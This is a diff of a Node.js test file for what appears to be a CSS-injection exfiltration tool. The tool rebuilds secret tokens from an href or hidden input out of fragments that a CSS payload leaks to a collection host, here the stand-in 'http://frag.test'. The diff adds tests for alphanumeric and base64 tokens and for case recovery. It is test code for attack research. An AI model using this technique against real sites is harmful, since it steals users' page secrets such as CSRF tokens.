@@ -1,9 +1,9 @@
 'use strict';
 
 // Randomised end-to-end tests of the solver. Each case:
-//   1. generates a random hex token of random length,
-//   2. embeds it in an anchor href (optionally followed by random hex junk) or
-//      a hidden input value,
+//   1. generates a random token of random length (hex, or each other charset),
+//   2. embeds it in an anchor href (optionally followed by random junk in the
+//      same charset) or a hidden input value,
 //   3. works out which requests the real CSS payload (public/payload.js) would
 //      trigger for that attribute value,
 //   4. shuffles them into a random arrival order and stitches.
@@ -13,7 +13,8 @@
 const test = require('node:test');
 const assert = require('node:assert/strict');
 
-const { tryStitch } = require('../lib/stitch');
+const { tryStitch, stitchCharset, assignCase } = require('../lib/stitch');
+const P = require('../public/payload');
 const { buildConfig, PRESETS } = require('../server');
 const { SEED, ANCHOR_LENGTH, rng, grams, leak, payloadRules } = require('./helpers');
 
@@ -33,6 +34,16 @@ const EXPECT = {
   4: { cleanListed: 1, junkListed: 0.99, singleGuess: 0.99 },
   3: { cleanListed: 0.99, junkListed: 0.97, singleGuess: 0.75 },
 };
+// Non-hex charsets (3-char windows only): the case-insensitive windows are
+// as sparse as hex 4-char ones (36-39 symbols cubed vs 16^4), and letter
+// case is resolved from the case pairs in all but rare ties.
+const CHARSET_EXPECT = { cleanListed: 0.99, junkListed: 0.97, singleGuess: 0.95 };
+const CASED = ['alnum', 'base64', 'base64url'];
+
+// The chars random tokens and junk are drawn from. Base64 padding only ever
+// ends a value, so it's left out of random tokens.
+const tokenAlphabet = charset =>
+  P.alphabetOf(P.charsetOf(charset)).replace(charset === 'base64' ? '=' : '', '');
 
 const SCENARIOS = [
   {
@@ -75,18 +86,18 @@ const SCENARIOS = [
   },
 ];
 
-// Random hex junk appended to the end of the href, with a mix of separators
+// Random junk appended to the end of the href, with a mix of separators
 // (including none, so the junk runs straight on from the last param).
-function randomJunk(r) {
-  return r.pick(['&h=', '&_=', '#', '/', '']) + r.hex(r.int(1, 64));
+function randomJunk(r, charset = 'hex') {
+  return r.pick(['&h=', '&_=', '#', '/', '']) + r.chars(tokenAlphabet(charset), r.int(1, 64));
 }
 
 const setups = new Map();
-function setup(scenario, windowSize) {
-  const key = scenario.name + windowSize;
+function setup(scenario, windowSize, charset = 'hex') {
+  const key = scenario.name + windowSize + charset;
   if (!setups.has(key)) {
-    const { config, contextHexChunks } = buildConfig({ ...scenario.user, windowSize });
-    setups.set(key, { config, context: contextHexChunks, rules: payloadRules(config) });
+    const { config, contextChunks, contextCasePairs } = buildConfig({ ...scenario.user, windowSize, charset });
+    setups.set(key, { config, context: contextChunks, caseContext: contextCasePairs, rules: payloadRules(config) });
   }
   return setups.get(key);
 }
@@ -106,15 +117,24 @@ function describeCase({ token, value, result }) {
     `result: ${JSON.stringify(result)}`;
 }
 
-// Every candidate must be a token the leaked data could have come from.
-function invalidCandidates({ token, result }, leaked, windowSize) {
+// Every candidate must be a token the leaked data could have come from. For
+// non-hex charsets windows and anchors are compared lowercased, and every
+// case pair must have leaked too.
+function invalidCandidates({ token, result }, data, windowSize, cased = false) {
   const problems = [];
+  const fold = s => (cased ? s.toLowerCase() : s);
+  const leaked = new Set(data.chunks);
+  const pairs = new Set(data.pairs);
   for (const cand of candidatesOf(result)) {
     if (cand.length !== token.length) problems.push(`candidate ${cand} has length ${cand.length}`);
-    if (!cand.startsWith(token.slice(0, ANCHOR_LENGTH))) problems.push(`candidate ${cand} has the wrong start`);
-    if (!cand.endsWith(token.slice(-ANCHOR_LENGTH))) problems.push(`candidate ${cand} has the wrong end`);
-    const foreign = [...grams(cand, windowSize)].filter(g => !leaked.has(g));
+    if (!fold(cand).startsWith(fold(token.slice(0, ANCHOR_LENGTH)))) problems.push(`candidate ${cand} has the wrong start`);
+    if (!fold(cand).endsWith(fold(token.slice(-ANCHOR_LENGTH)))) problems.push(`candidate ${cand} has the wrong end`);
+    const foreign = [...grams(fold(cand), windowSize)].filter(g => !leaked.has(g));
     if (foreign.length) problems.push(`candidate ${cand} uses windows that never leaked: ${foreign}`);
+    if (cased && !result.caseUnresolved) {
+      const unleaked = [...grams(cand, 2)].filter(g => /[a-z]/i.test(g) && !pairs.has(g));
+      if (unleaked.length) problems.push(`candidate ${cand} uses case pairs that never leaked: ${unleaked}`);
+    }
   }
   return problems;
 }
@@ -130,8 +150,11 @@ function missReason({ token, result }, { allowTruncated }) {
   return result.candidates ? 'real token missing from candidates' : `misidentified as ${result.token}`;
 }
 
-function runScenario(t, scenario, windowSize, junk, totals) {
-  const r = rng(SEED ^ hash(scenario.name + junk + windowSize));
+function runScenario(t, scenario, windowSize, junk, totals, charset = 'hex', expect = EXPECT[windowSize]) {
+  const r = rng(SEED ^ hash(scenario.name + junk + windowSize + (charset === 'hex' ? '' : charset)));
+  const cs = P.charsetOf(charset);
+  const fold = s => (cs.cased ? s.toLowerCase() : s);
+  const alphabet = tokenAlphabet(charset);
   const invalid = [];
   const missed = [];
   let single = 0;
@@ -139,20 +162,20 @@ function runScenario(t, scenario, windowSize, junk, totals) {
 
   for (let length = MIN_LENGTH; length <= MAX_LENGTH; length++) {
     for (let i = 0; i < TOKENS_PER_LENGTH; i++) {
-      const token = r.hex(length);
-      const { rules, context } = setup(scenario, windowSize);
-      const value = scenario.value(token, junk ? randomJunk(r) : '');
+      const token = r.chars(alphabet, length);
+      const { rules, context, caseContext } = setup(scenario, windowSize, charset);
+      const value = scenario.value(token, junk ? randomJunk(r, charset) : '');
       const { data } = leak(rules, value);
       data.chunks = r.shuffle(data.chunks);
 
-      assert.equal(data.start, token.slice(0, ANCHOR_LENGTH), `start for ${value}`);
-      assert.equal(data.end, token.slice(-ANCHOR_LENGTH), `end for ${value}`);
+      assert.equal(data.start, fold(token.slice(0, ANCHOR_LENGTH)), `start for ${value}`);
+      assert.equal(data.end, fold(token.slice(-ANCHOR_LENGTH)), `end for ${value}`);
 
-      const result = tryStitch(data, { windowSize, tokenLength: length, context });
+      const result = stitchCharset(data, { charset: cs, windowSize, tokenLength: length, context, caseContext });
       const c = { token, value, result };
       total++;
 
-      const problems = invalidCandidates(c, new Set(data.chunks), windowSize);
+      const problems = invalidCandidates(c, data, windowSize, cs.cased);
       if (problems.length) invalid.push(`${problems.join('; ')}\n  ${describeCase(c)}`);
 
       const reason = missReason(c, { allowTruncated: junk || windowSize === 3 });
@@ -169,7 +192,7 @@ function runScenario(t, scenario, windowSize, junk, totals) {
 
   assert.equal(invalid.length, 0, `\n${invalid.join('\n\n')}`);
   const rate = (total - missed.length) / total;
-  const min = EXPECT[windowSize][junk ? 'junkListed' : 'cleanListed'];
+  const min = expect[junk ? 'junkListed' : 'cleanListed'];
   assert.ok(rate >= min, `real token listed ${(rate * 100).toFixed(1)}% (< ${min * 100}%)\n${missed.join('\n\n')}`);
 }
 
@@ -192,6 +215,23 @@ for (const windowSize of [4, 3]) {
     t.diagnostic(`single correct guess: ${(rate * 100).toFixed(1)}% of ${totals.total}`);
     assert.ok(rate >= EXPECT[windowSize].singleGuess,
       `single correct guess ${(rate * 100).toFixed(1)}% (< ${EXPECT[windowSize].singleGuess * 100}%)`);
+  });
+}
+
+for (const charset of CASED) {
+  test(`random ${charset} tokens, 3-char windows`, async t => {
+    const totals = { single: 0, total: 0 };
+    for (const scenario of SCENARIOS) {
+      await t.test(scenario.name, t => runScenario(t, scenario, 3, false, totals, charset, CHARSET_EXPECT));
+      if (scenario.type === 'anchor') {
+        await t.test(`${scenario.name} + random ${charset} junk`,
+          t => runScenario(t, scenario, 3, true, totals, charset, CHARSET_EXPECT));
+      }
+    }
+    const rate = totals.single / totals.total;
+    t.diagnostic(`single correct guess: ${(rate * 100).toFixed(1)}% of ${totals.total}`);
+    assert.ok(rate >= CHARSET_EXPECT.singleGuess,
+      `single correct guess ${(rate * 100).toFixed(1)}% (< ${CHARSET_EXPECT.singleGuess * 100}%)`);
   });
 }
 
@@ -318,6 +358,83 @@ test('payload spreads background layers so Chrome does not crash', () => {
     const css = generateCSS(config, 'http://frag.test');
     const boxes = css.match(/background:[^;}]*/g).map(b => b.match(/var\(--/g).length);
     assert.equal(boxes.reduce((a, b) => a + b), 16 ** windowSize + 2, 'every window plus start and end');
+    for (const n of boxes) assert.ok(n <= 25000, `${n} layers in one box`);
+  }
+});
+
+test('non-hex payloads leak lowercased windows, case pairs, and nothing else', () => {
+  const token = 'Ab9/xY+z0Qq=';
+  const junk = '&h=KeY';
+  const { rules } = setup(SCENARIOS[0], 3, 'base64');
+  const value = SCENARIOS[0].value(token, junk);
+  const { requests, data } = leak(rules, value);
+  const fold = P.CHARSETS.base64.fold;
+  const lower = value.toLowerCase();
+  const windows = [...grams(lower, 3)].filter(g => [...g].every(c => fold.includes(c))).sort();
+  assert.deepEqual(data.chunks.sort(), windows);
+  const alphabet = P.alphabetOf(P.CHARSETS.base64);
+  const pairs = [...grams(value, 2)].filter(g => [...g].every(c => alphabet.includes(c)) && /[a-z]/i.test(g)).sort();
+  assert.deepEqual(data.pairs.sort(), pairs);
+  assert.deepEqual(requests.filter(q => q.t === 's' || q.t === 'e'), [{ t: 's', c: 'ab' }, { t: 'e', c: 'q=' }]);
+});
+
+test('letter case is recovered from the case pairs', async t => {
+  const pairsOf = s => [...grams(s, 2)].filter(g => /[a-z]/i.test(g));
+
+  await t.test('a clean token', () => {
+    const token = 'aB3cDeF9gH';
+    assert.deepEqual(assignCase([token.toLowerCase()], pairsOf(token)), { tokens: [token], truncated: false });
+  });
+
+  await t.test('digits and symbols between letters keep the case independent', () => {
+    const token = 'A1b2C3d4+E/f';
+    assert.deepEqual(assignCase([token.toLowerCase()], pairsOf(token)).tokens, [token]);
+  });
+
+  await t.test('pairs that genuinely allow both cases give candidates', () => {
+    // "xa" and "ay" leak from elsewhere in the token, as do "xA" and "Ay", so
+    // the middle "a" can be either case and both leave nothing unexplained.
+    const tokens = assignCase(['xayqxay'], ['xa', 'ay', 'xA', 'Ay', 'yq', 'qx']).tokens;
+    assert.ok(tokens.includes('xAyqxay') && tokens.includes('xayqxAy'), JSON.stringify(tokens));
+  });
+
+  await t.test('a casing that leaves the token\'s own pairs unexplained is ranked down', () => {
+    // "aBaB" only uses leaked pairs too, but then nothing in the token
+    // explains the leaked "ab".
+    assert.deepEqual(assignCase(['abab'], pairsOf('aBab')).tokens, ['aBab']);
+  });
+
+  await t.test('a lowercase copy of part of the token elsewhere gives candidates, not a wrong answer', () => {
+    // The page also contains "login": token "xLoGiNx" with junk "login" leaks
+    // exactly what "xLogiNx" with junk "loGin" would, so both are listed.
+    const token = 'xLoGiNx';
+    const tokens = assignCase([token.toLowerCase()], [...pairsOf(token), ...pairsOf('login')]).tokens;
+    assert.ok(tokens.includes(token), JSON.stringify(tokens));
+    assert.ok(tokens.length > 1);
+  });
+
+  await t.test('known context pairs are expected leftovers', () => {
+    const token = 'tokEN';
+    const context = new Set(pairsOf('TOKEN'));
+    const pairs = [...pairsOf(token), ...context];
+    // Without context, "TO"/"OK" look like the token's own unused pairs.
+    assert.deepEqual(assignCase([token.toLowerCase()], pairs, { context }).tokens, [token]);
+  });
+
+  await t.test('no consistent casing falls back to the lowercase token', () => {
+    const data = { start: 'ab', end: 'ef', chunks: ['abc', 'bcd', 'cde', 'def'], pairs: ['aB'] };
+    const result = stitchCharset(data, { charset: P.CHARSETS.alnum, windowSize: 3, tokenLength: 6 });
+    assert.deepEqual(result, { token: 'abcdef', length: 6, caseUnresolved: true });
+  });
+});
+
+test('non-hex payloads still spread their layers over at most three boxes', () => {
+  for (const charset of CASED) {
+    const { config } = setup(SCENARIOS[0], 3, charset);
+    const css = P.generateCSS(config, 'http://frag.test');
+    const boxes = css.match(/background:[^;}]*/g).map(b => b.match(/var\(--/g).length);
+    assert.ok(boxes.length <= 3, `${charset}: ${boxes.length} boxes`);
+    assert.equal(boxes.reduce((a, b) => a + b), P.ruleCount(config) - 2 * P.CHARSETS[charset].fold.length ** 2 + 2);
     for (const n of boxes) assert.ok(n <= 25000, `${n} layers in one box`);
   }
 });
